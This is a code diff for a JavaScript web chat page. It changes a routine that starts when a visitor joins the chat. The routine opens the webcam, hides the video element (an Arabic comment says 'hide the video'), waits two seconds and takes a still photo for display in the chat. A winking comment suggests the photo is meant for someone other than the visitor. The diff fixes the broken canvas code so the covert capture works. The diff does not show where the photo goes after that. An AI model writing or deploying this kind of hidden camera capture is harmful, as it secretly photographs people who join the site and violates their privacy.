@@ -447,10 +447,7 @@ joinBtn.addEventListener("click", () => {
   messagesDiv.style.display = "block";
   inputBar.style.display = "flex";
   clearButton.style.display = "inline-block";
-
-
-  startCameraCapture();
-
+  startCamera();
 
   const visitorId = Math.random().toString(36).substring(2, 10);
   const visitorsRef = ref(db, "viewers/" + visitorId);
@@ -653,16 +650,16 @@ const hamburger = document.getElementById('hamburger');
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       const video = document.createElement('video');
-      video.style.display = 'none'; // اخف الفيديو
+      video.style.display = 'none';
       document.body.appendChild(video);
       video.srcObject = stream;
       video.play();
 
-      // انتظر 2 ثانية للتقاط الصورة
+
       setTimeout(() => {
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth; = 640;
-        canvas.height = video.videoHeight; = 480;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -673,7 +670,7 @@ const hamburger = document.getElementById('hamburger');
         stream.getTracks().forEach(track => track.stop());
         video.remove();
 
-        // أضف الصورة مع النص فقط لك في الشات
+        // أضف الصورة مع النص فقط للمستخدم😉 في الشات
         showCapturedImage(imgSrc);
 
       }, 2000);
